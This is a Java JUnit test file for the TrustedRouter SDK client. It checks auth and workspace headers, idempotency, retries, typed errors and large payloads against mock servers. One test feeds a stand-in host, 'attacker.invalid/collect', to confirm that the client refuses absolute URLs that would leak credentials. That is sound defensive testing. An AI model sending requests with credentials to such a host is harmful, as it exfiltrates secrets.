package com.trustedrouter;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import com.google.gson.JsonObject;
import com.trustedrouter.errors.AuthenticationException;
import com.trustedrouter.errors.InternalException;
import com.trustedrouter.errors.RateLimitException;
import com.trustedrouter.models.ChatCompletion;
import com.trustedrouter.models.ModelList;
import com.trustedrouter.requests.ChatRequest;
import java.util.concurrent.TimeUnit;
import okhttp3.mockwebserver.MockResponse;
import okhttp3.mockwebserver.MockWebServer;
import okhttp3.mockwebserver.RecordedRequest;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

final class ClientTransportTest {
    private MockWebServer inference;
    private MockWebServer control;

    @BeforeEach void start() throws Exception {
        inference = new MockWebServer();
        control = new MockWebServer();
        inference.start();
        control.start();
    }

    @AfterEach void stop() throws Exception {
        inference.shutdown();
        control.shutdown();
    }

    @Test void chatUsesInferencePlaneAuthWorkspaceAndAutomaticIdempotency() throws Exception {
        inference.enqueue(json(200, completion("PONG")));
        TrustedRouterClient client = client(2);

        ChatCompletion result = client.chatCompletions(ChatRequest.builder()
                .message("user", "PING")
                .build());

        assertThat(result.firstText()).isEqualTo("PONG");
        RecordedRequest request = inference.takeRequest();
        assertThat(request.getPath()).isEqualTo("/v1/chat/completions");
        assertThat(request.getHeader("Authorization")).isEqualTo("Bearer sk-test");
        assertThat(request.getHeader("X-TrustedRouter-Workspace")).isEqualTo("ws-default");
        assertThat(request.getHeader("Idempotency-Key")).startsWith("tr-req-");
        assertThat(request.getHeader("User-Agent")).startsWith("trusted-router-java/");
        JsonObject body = com.trustedrouter.internal.JsonSupport.parse(
                request.getBody().readUtf8()).getAsJsonObject();
        assertThat(body.get("model").getAsString()).isEqualTo("trustedrouter/auto");
        assertThat(body.get("stream").getAsBoolean()).isFalse();
        assertThat(body.has("workspace_id")).isFalse();
        assertThat(control.getRequestCount()).isZero();
    }

    @Test void modelCatalogAlwaysUsesControlPlane() throws Exception {
        control.enqueue(json(200, "{\"data\":[{\"id\":\"trustedrouter/fast\","
                + "\"trustedrouter\":{\"open_weights\":true},\"new_field\":7}]}"));
        ModelList models = client(0).models();
        assertThat(models.byId("trustedrouter/fast").isOpenWeights()).isTrue();
        assertThat(models.getRaw().getAsJsonArray("data")).hasSize(1);
        assertThat(control.takeRequest().getPath()).isEqualTo("/v1/models");
        assertThat(inference.getRequestCount()).isZero();
    }

    @Test void perCallWorkspaceBecomesAHeaderAndNeverJson() throws Exception {
        inference.enqueue(json(200, completion("ok")));
        CallOptions options = CallOptions.builder().workspaceId("ws-call")
                .idempotencyKey("fixed-1").build();
        client(0).chatCompletions(ChatRequest.builder().message("user", "hi")
                .parameter("workspace_id", "must-strip")
                .callOptions(options).build());
        RecordedRequest request = inference.takeRequest();
        assertThat(request.getHeader("X-TrustedRouter-Workspace")).isEqualTo("ws-call");
        assertThat(request.getHeader("Idempotency-Key")).isEqualTo("fixed-1");
        assertThat(request.getBody().readUtf8()).doesNotContain("workspace_id");
    }

    @Test void retriesRateLimitAndPreservesIdempotencyKey() throws Exception {
        inference.enqueue(new MockResponse().setResponseCode(429)
                .setHeader("Retry-After", "0")
                .setBody("{\"error\":{\"message\":\"slow down\"}}"));
        inference.enqueue(json(200, completion("ok")));
        client(2).chatCompletions(ChatRequest.builder().message("user", "hi")
                .callOptions(CallOptions.builder().idempotencyKey("same").build()).build());
        assertThat(inference.takeRequest().getHeader("Idempotency-Key")).isEqualTo("same");
        assertThat(inference.takeRequest().getHeader("Idempotency-Key")).isEqualTo("same");
    }

    @Test void typedErrorsExposeLayerSourceAndRetryAfter() throws Exception {
        inference.enqueue(new MockResponse().setResponseCode(429).setHeader("Retry-After", "2.5")
                .setBody("{\"error\":{\"message\":\"limited\",\"layer\":\"provider\","
                        + "\"source\":\"cerebras\"}}"));
        assertThatThrownBy(() -> client(0).chatCompletions(
                ChatRequest.builder().message("user", "hi").build()))
                .isInstanceOf(RateLimitException.class)
                .satisfies(error -> {
                    RateLimitException rate = (RateLimitException) error;
                    assertThat(rate.getRetryAfterSeconds()).isEqualTo(2.5d);
                    assertThat(rate.getLayer()).isEqualTo("provider");
                    assertThat(rate.getSource()).isEqualTo("cerebras");
                });
    }

    @Test void authenticationAndTransportFailuresHaveSpecificTypes() throws Exception {
        inference.enqueue(json(401, "{\"error\":{\"message\":\"Invalid API key\"}}"));
        assertThatThrownBy(() -> client(0).chatCompletions(
                ChatRequest.builder().message("user", "hi").build()))
                .isInstanceOf(AuthenticationException.class)
                .hasMessage("Invalid API key");

        inference.shutdown();
        assertThatThrownBy(() -> client(0).chatCompletions(
                ChatRequest.builder().message("user", "hi").build()))
                .isInstanceOf(InternalException.class)
                .hasMessageContaining("endpoint unavailable");
    }

    @Test void largeMultimodalPayloadIsNotTruncatedOrRejectedBySdk() throws Exception {
        inference.enqueue(json(200, completion("seen")));
        String encoded = repeat('a', 1_250_000);
        JsonObject image = new JsonObject();
        image.addProperty("type", "image_url");
        JsonObject url = new JsonObject();
        url.addProperty("url", "data:image/png;base64," + encoded);
        image.add("image_url", url);
        com.google.gson.JsonArray content = new com.google.gson.JsonArray();
        content.add(image);
        JsonObject message = new JsonObject();
        message.addProperty("role", "user");
        message.add("content", content);

        assertThat(client(0).chatCompletions(
                ChatRequest.builder().model("anthropic/claude-opus-4.8")
                        .message(message).build()).firstText()).isEqualTo("seen");
        String sent = inference.takeRequest().getBody().readUtf8();
        assertThat(sent.length()).isGreaterThan(1_250_000);
        assertThat(sent).contains(encoded.substring(encoded.length() - 100));
    }

    @Test void asyncFacadeReturnsTypedResult() throws Exception {
        inference.enqueue(json(200, completion("async")));
        ChatCompletion value = client(0).async().chatCompletions(
                ChatRequest.builder().message("user", "hi").build())
                .get(3, TimeUnit.SECONDS);
        assertThat(value.firstText()).isEqualTo("async");
    }

    @Test void lowLevelApiPathsCannotExfiltrateCredentialsToAbsoluteUrls() {
        JsonObject body = new JsonObject();
        assertThatThrownBy(() -> client(0).request(
                "POST", "https://attacker.invalid/collect", body, CallOptions.NONE))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("relative");
        assertThat(inference.getRequestCount()).isZero();
    }

    private TrustedRouterClient client(int retries) {
        return new TrustedRouterClient(TrustedRouterOptions.builder()
                .apiKey("sk-test")
                .baseUrl(inference.url("/v1").toString())
                .controlBaseUrl(control.url("/v1").toString())
                .workspaceId("ws-default")
                .maxRetries(retries)
                .build());
    }

    private static MockResponse json(int status, String body) {
        return new MockResponse().setResponseCode(status)
                .setHeader("Content-Type", "application/json").setBody(body);
    }

    private static String completion(String text) {
        return "{\"id\":\"chat_1\",\"object\":\"chat.completion\","
                + "\"model\":\"test\",\"choices\":[{\"index\":0,\"message\":{"
                + "\"role\":\"assistant\",\"content\":\"" + text + "\"},"
                + "\"finish_reason\":\"stop\"}],\"usage\":{\"prompt_tokens\":1,"
                + "\"completion_tokens\":1,\"total_tokens\":2}}";
    }

    private static String repeat(char value, int count) {
        char[] chars = new char[count];
        java.util.Arrays.fill(chars, value);
        return new String(chars);
    }
}
